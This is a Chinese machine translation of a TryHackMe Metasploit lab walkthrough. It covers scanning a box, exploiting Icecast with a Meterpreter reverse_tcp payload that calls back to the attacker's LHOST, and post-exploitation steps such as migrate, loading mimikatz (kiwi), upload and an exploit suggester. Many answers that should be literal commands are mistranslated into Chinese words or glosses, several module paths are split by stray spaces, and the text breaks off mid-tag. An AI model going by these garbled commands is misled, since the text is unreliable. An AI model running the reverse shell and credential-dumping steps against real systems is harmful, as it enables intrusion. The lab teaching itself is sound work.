<html>
<head>
<title>RP: Metasploit Walkthrough: TryHackMe</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">RP: Metasploit演练:TryHackMe</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/rp-metasploit-walkthrough-tryhackme-63f01ce1f535?source=collection_archive---------0-----------------------#2020-07-05">https://infosecwriteups.com/rp-metasploit-walkthrough-tryhackme-63f01ce1f535?source=collection_archive---------0-----------------------#2020-07-05</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/f30a4b6c8e3f76cf314f891bffbc1433.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-mVgJOnMCM9Xu_1CIhVMqQ.jpeg"/></div></div></figure><p id="b88e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">正如标题所言。这是“RP: Metasploit”的演练。房间链接是<a class="ae kw" href="https://tryhackme.com/room/rpmetasploit" rel="noopener ugc nofollow" target="_blank">https://tryhackme.com/room/rpmetasploit</a>。</p><p id="6822" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我建议你仔细遵循指南和说明。他们解释得很好。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="cafd" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">【任务一】</strong> <em class="mc">简介</em></h1><p id="6832" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv ij bi translated">Metasploit是一个开源的笔测试框架，是一个被世界各地的安全工程师使用的强大工具。由Rapid 7维护的Metasploit不仅收集了经过全面测试的漏洞，还收集了辅助和后期开发工具。在这个房间里，我们将探索使用这个庞大的框架和它包括的几个模块的基础。</p><p id="8b4a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> <em class="mi"> #1 </em> </strong> Kali和Linux的大多数其他安全发行版默认包含Metasploit。如果您使用的是不同的Linux发行版，请验证您已经安装了它，或者从Rapid 7 Github存储库中安装它。</p></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="466a" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">【任务2】<em class="mc">初始化… </em> </strong></h1><p id="18a2" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv ij bi translated">首先，我们需要初始化数据库！现在让我们使用命令来完成这项工作:</p><blockquote class="mj mk ml"><p id="c344" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">msfdb初始化</p></blockquote><p id="217e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> #2 </strong>在启动Metasploit之前，我们可以查看一些可以触发来启动控制台的高级选项。现在使用以下命令检查这些内容:</p><blockquote class="mj mk ml"><p id="551b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">msfconsole -h</p></blockquote><p id="9195" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> #3 </strong>我们可以在命令行上启动Metasploit控制台，而不显示横幅或任何启动信息。我们在msfconsole中添加什么开关来启动它而不显示这些信息？这将包括'-'</p><blockquote class="mj mk ml"><p id="4af9" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">问</p></blockquote><p id="5268" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">一旦数据库被初始化，继续通过命令启动Metasploit:</p><blockquote class="mj mk ml"><p id="c87a" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">msfconsole</p></blockquote><p id="4970" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#5在Metasploit启动之后，让我们继续检查我们是否已经连接到数据库。现在使用以下命令执行此操作:</p><blockquote class="mj mk ml"><p id="8d42" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">数据库状态</p></blockquote><p id="b5c9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#6酷！我们已经连接到数据库，Metasploit 5使用哪种类型的数据库？</p><blockquote class="mj mk ml"><p id="b239" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">一种数据库系统</p></blockquote></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="5d9a" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">【任务3】</strong><em class="mc">尽情摇滚【命令】</em></h1><p id="288a" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv ij bi translated">使用帮助菜单，现在让我们学习Metasploit中的基本命令和模块类别。以下问题的几乎所有答案都可以在Metasploit帮助菜单中找到。</p><p id="b2d5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#1让我们开始探索帮助菜单。在Metasploit提示符下(使用msfconsole启动Metasploit后，我们将处于该位置)，键入命令:</p><blockquote class="mj mk ml"><p id="d19c" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">帮助</p></blockquote><p id="671e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#2帮助菜单有一个很短的单字符别名，它是什么？</p><blockquote class="mj mk ml"><p id="8c09" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi">?</p></blockquote><p id="6c21" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#3在Metasploit中找到我们可以随意使用的各种模块是我们在框架中最常用的命令之一。我们用于搜索的基本命令是什么？</p><blockquote class="mj mk ml"><p id="619e" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">搜索</p></blockquote><p id="bafa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#4一旦我们找到了想要利用的模块，我们使用什么命令来选择它作为活动模块？</p><blockquote class="mj mk ml"><p id="72b0" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">使用</p></blockquote><p id="c978" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#5如果我们想查看特定模块的信息，或者只是我们选择的活动模块的信息，该怎么办？</p><blockquote class="mj mk ml"><p id="e3c5" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">信息</p></blockquote><p id="a1d8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#6 Metasploit有一个内置的类似netcat的功能，我们可以快速连接到一个主机，只是为了验证我们可以与它“交谈”。这是什么命令？</p><blockquote class="mj mk ml"><p id="6db6" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">连接</p></blockquote><p id="51d4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#7完全是一个纯粹用于娱乐的命令，当我们启动msfconsole(不带-q标志)时，哪个命令显示我们看到的motd/ascii艺术？</p><blockquote class="mj mk ml"><p id="8647" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">旗帜</p></blockquote><p id="d3a9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#8我们稍后将再次讨论这两个命令，但是，它们是Metasploit中最常用的两个命令。首先，我们用什么命令来改变一个变量的值？</p><blockquote class="mj mk ml"><p id="ae6b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">设置</p></blockquote><p id="cfb0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#9 Metasploit支持使用全局变量，当你特别关注单个盒子时，这是非常有用的。什么命令可以全局改变变量的值？</p><blockquote class="mj mk ml"><p id="1058" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">setg</p></blockquote><p id="4a6a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#10现在我们已经了解了如何改变变量的值，我们如何看待它们？从技术上讲，这个问题有几个答案，但是，我在寻找一个特定的三个字母的命令，用于查看单个变量的值。</p><blockquote class="mj mk ml"><p id="c320" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">得到</p></blockquote><p id="872f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#11把变量值改成null/无值怎么样？</p><blockquote class="mj mk ml"><p id="2eb9" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">复原</p></blockquote><p id="f736" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#12在执行渗透测试时，通常会记录您的屏幕，以便进一步检查或提供所采取的任何行动的证据。这通常与将控制台输出收集到一个文件相结合，因为它对于将不同的信息输出到屏幕上非常有用。我们可以使用什么命令将控制台输出设置为保存到文件？</p><blockquote class="mj mk ml"><p id="d853" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">线轴</p></blockquote><p id="e770" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#13让Metasploit控制台保持运行并不总是很方便，在启动Metasploit时加载我们之前设置的所有值会很有帮助。我们可以使用什么命令将Metasploit中的设置/活动数据存储存储到设置文件中？这将保存在您的msf4(或msf5)目录中，并且可以通过简单地删除创建的设置文件来轻松撤消。</p><blockquote class="mj mk ml"><p id="5d9d" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">救援</p></blockquote></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="0840" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated"><strong class="ak">【任务4】适合各种场合的模块！</strong></h1><p id="292d" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv ij bi translated">Metasploit由六个核心模块组成，它们构成了您将在其中使用的大部分工具。让我们快速浏览一下各个模块、它们的用途以及一些与模块相关的命令。</p><figure class="mq mr ms mt gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mp"><img src="../Images/5326228f669897f5066421fdfac5b3d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WBktzLZGIA3CZrIcs3x2ow.png"/></div></div><figcaption class="mu mv gj gh gi mw mx bd b be z dk translated">*注意，此图包括接口和*大部分*模块。此图不包括“Post”模块。</figcaption></figure><p id="3cc8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#1最常用的模块，哪个模块包含我们将使用的所有漏洞利用代码？</p><blockquote class="mj mk ml"><p id="6bfc" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">剥削</p></blockquote><p id="13e2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#2与漏洞利用一起使用，哪个模块包含我们发送的在漏洞利用后执行的各种外壳代码？</p><blockquote class="mj mk ml"><p id="985b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">有效载荷</p></blockquote><p id="7d06" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#3扫描和验证机器中最常用的模块是哪个？这当然不同于实际的剥削。</p><blockquote class="mj mk ml"><p id="72a6" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">辅助的</p></blockquote><p id="18ce" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#4剥削后最常见的活动之一是抢劫和旋转。哪个模块提供这些功能？</p><blockquote class="mj mk ml"><p id="473b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">邮政</p></blockquote><p id="78bc" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#5通常在有效负载混淆中使用，哪个模块允许我们修改漏洞的“外观”,以便我们可以避免签名检测？</p><blockquote class="mj mk ml"><p id="41b5" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">编码器</p></blockquote><p id="6818" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#6最后但同样重要的是，缓冲区溢出和ROP攻击使用哪个模块？</p><blockquote class="mj mk ml"><p id="c5d8" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">not otherwise provided 除非另有规定</p></blockquote><p id="2d59" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#7并非每个模块都是默认加载的，我们可以使用什么命令来加载不同的模块？</p><blockquote class="mj mk ml"><p id="296b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">负荷</p></blockquote></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="1297" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">移动那个壳！</h1><p id="9650" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv ij bi translated">是时候部署机器了。我在考虑机器IP为10.10.x.x。</p><p id="e5fa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">注意:Metasploit支持辅助模块中不同类型的端口扫描。Metasploit还可以从nmap和Nessus导入其他扫描，这里仅举几例。</p><p id="43f4" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#1 Metasploit提供了一种内置的方式来运行nmap并将其结果直接输入到我们的数据库中。现在让我们使用以下命令来运行它:</p><blockquote class="mj mk ml"><p id="53e0" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">db_nmap -sV BOX-IP</p></blockquote><p id="1419" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"># 2 What识别端口135上运行的是什么服务？</p><blockquote class="mj mk ml"><p id="730b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">msrpc</p></blockquote><p id="04de" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#3让我们继续，看看我们在数据库中收集了哪些信息。现在尝试在msfconsole中键入命令“hosts”。</p><blockquote class="mj mk ml"><p id="1d79" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">主机</p></blockquote><p id="db26" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#4数据库中的其他内容如何，现在尝试命令“服务”。</p><blockquote class="mj mk ml"><p id="d0ea" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">服务</p></blockquote><p id="c4e5" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#5最后一件事，现在试试命令“vulns”。目前这不会显示太多，但是值得注意的是Metasploit将跟踪发现的漏洞。快速有效地利用数据库的许多方法之一。</p><blockquote class="mj mk ml"><p id="9770" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">vulns</p></blockquote><p id="c230" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#6现在我们已经扫描了我们的受害者系统，让我们尝试使用Metasploit有效负载连接到它。首先，我们必须搜索目标有效载荷。在Metasploit 5(撰写本文时的最新版本)中，您可以简单地键入“use ”,后跟一个仅在目标漏洞中找到的唯一字符串。例如，现在用下面的命令“使用icecast”来尝试一下。现在出现在msfconsole提示符上的漏洞利用的完整路径是什么？*这将包括开头的漏洞利用部分。</p><blockquote class="mj mk ml"><p id="dc36" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">exploit/windows/http/ice cast _ header</p></blockquote><p id="4219" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#7虽然带有唯一字符串use命令非常有用，但这并不是我们想要的利用方式。现在让我们运行命令‘搜索多重/处理器’。控制台最左侧显示在“名称”旁边的列的名称是什么？继续运行命令“use NUMBER _ NEXT _ TO exploit/multi/handler ”,其中数字将显示在最左边的列中(通常为4或5)。这样，我们可以使用我们的搜索结果，而不需要输入我们想要使用的模块的全名/路径。</p><blockquote class="mj mk ml"><p id="cfb8" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi">#</p></blockquote><p id="25a8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#8现在键入命令“使用NUMBER_FROM_PREVIOUS_QUESTION”。这是使用搜索结果返回的模块的捷径。</p><blockquote class="mj mk ml"><p id="55d1" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">使用6</p></blockquote><p id="a230" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#9接下来，让我们使用此命令“set PAYLOAD windows/meter preter/reverse _ TCP”来设置有效负载。通过这种方式，我们可以修改我们希望利用的有效载荷。此外，让我们运行这个命令' set LHOST YOUR_IP_ON_TRYHACKME '。你可能需要使用命令'<strong class="ka ir"> ip addr </strong>'来检查你的IP，它很可能是你的<strong class="ka ir"> tun0接口</strong>。</p><blockquote class="mj mk ml"><p id="693c" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">set PAYLOAD windows/meter preter/reverse _ TCP<br/>IP addr<br/>set LHOST YOUR _ IP _ ON _ TRYHACKME</p></blockquote><p id="653b" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#10让我们继续，回到我们以前的利用，运行命令`使用冰铸'再次选择它。</p><blockquote class="mj mk ml"><p id="32bf" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">使用icecast</p></blockquote><p id="1956" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#11在我们运行我们的漏洞之前的最后一步。运行命令“set RHOST BOX_IP”来告诉Metasploit要攻击哪个目标。</p><blockquote class="mj mk ml"><p id="af0b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">设置主机盒_IP</p></blockquote><p id="12ad" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#12一旦您正确设置了这些变量，现在就可以通过命令“exploit”或命令“run -j”来运行漏洞，将此作为一项任务来运行。</p><blockquote class="mj mk ml"><p id="7d9a" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">剥削</p></blockquote><p id="c3ed" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#13启动后，我们可以通过运行“jobs”命令来检查系统上运行的所有作业</p><blockquote class="mj mk ml"><p id="2f9b" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">工作</p></blockquote><p id="a742" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#14在下一个任务中建立连接后，我们可以使用“sessions”命令列出所有会话。同样，我们可以使用命令“sessions -i SESSION_NUMBER”与目标会话进行交互</p><blockquote class="mj mk ml"><p id="41ab" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">会话-i会话号</p></blockquote></div><div class="ab cl kx ky hu kz" role="separator"><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc ld"/><span class="la bw bk lb lc"/></div><div class="ij ik il im in"><h1 id="aaa8" class="le lf iq bd lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw lx ly lz ma mb bi translated">[任务6]我们进来了，现在做什么？</h1><p id="3d38" class="pw-post-body-paragraph jy jz iq ka b kb md kd ke kf me kh ki kj mf kl km kn mg kp kq kr mh kt ku kv ij bi translated">现在我们已经有了受害者机器的外壳，让我们看看我们可以利用的几个利用后模块操作！下一节中的大多数问题都可以通过使用“帮助”命令访问的Meterpreter帮助菜单来回答。当我们加载更多的模块时，这个菜单会动态扩展。</p><p id="822c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">首先，我们最初的外壳/进程通常不太稳定。让我们继续尝试转向不同的流程。首先，让我们使用命令' ps '列出进程。假脱机服务的名称是什么？</p><blockquote class="mj mk ml"><p id="29b6" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">spoolsv.exe</p></blockquote><p id="3dbd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#2让我们继续进入假脱机流程，或者至少尝试这样做！我们使用什么命令将自己转移到流程中？因为我们没有足够的权限，所以这在当前是行不通的，但是我们仍然可以尝试！</p><blockquote class="mj mk ml"><p id="a228" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">移动</p></blockquote><p id="28fe" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#3迁移没有成功，让我们找到更多关于系统的信息，这样我们就可以尝试提升。我们可以运行什么命令来查找关于运行我们所在进程的当前用户的更多信息？</p><blockquote class="mj mk ml"><p id="a7ae" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">getuid</p></blockquote><p id="786e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#4如何找到关于系统本身的更多信息？</p><blockquote class="mj mk ml"><p id="1c16" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">sysinfo</p></blockquote><p id="c631" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#5这可能需要一点谷歌搜索，我们运行什么来加载mimikatz(更具体地说是mimikatz的新版本)，以便我们可以使用它？</p><blockquote class="mj mk ml"><p id="e794" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">装猕猴桃</p></blockquote><p id="d592" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#6让我们继续，找出我们当前用户的权限，我们运行什么命令？</p><blockquote class="mj mk ml"><p id="35ec" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">getprivs</p></blockquote><p id="9410" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#7我们运行什么命令将文件传输到受害者计算机？</p><blockquote class="mj mk ml"><p id="92ac" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">上传</p></blockquote><p id="73af" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#8如果我们想运行一个Metasploit模块呢？</p><blockquote class="mj mk ml"><p id="17a4" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">奔跑</p></blockquote><p id="15aa" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#9一个简单但非常必要的问题，我们应该运行什么命令来计算受害者的网络信息和接口？</p><blockquote class="mj mk ml"><p id="859a" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">用于查看本机的IP信息</p></blockquote><p id="d8fd" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#10让我们继续从Metasploit运行几个post模块。首先，让我们运行命令“运行post/windows/gather/checkvm”。这将决定我们是否在一个虚拟机中，这是一个非常有用的知识，有助于进一步分析。</p><blockquote class="mj mk ml"><p id="3617" class="jy jz mi ka b kb kc kd ke kf kg kh ki mm kk kl km mn ko kp kq mo ks kt ku kv ij bi translated">运行post/windows/gather/checkvm</p></blockquote><p id="c6d2" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">#11接下来，我们试试:`跑post/multi/recon/local _ exploit _ suggest er `。这将检查各种利用，我们可以在我们的会话中运行，以提升我们的特权。请随意使用这些建议进行实验，但是，我们将在“Ice”室中对此进行更详细的讨论。</p><blockquote class="mj mk ml"><p id="698e" class="jy jz mi 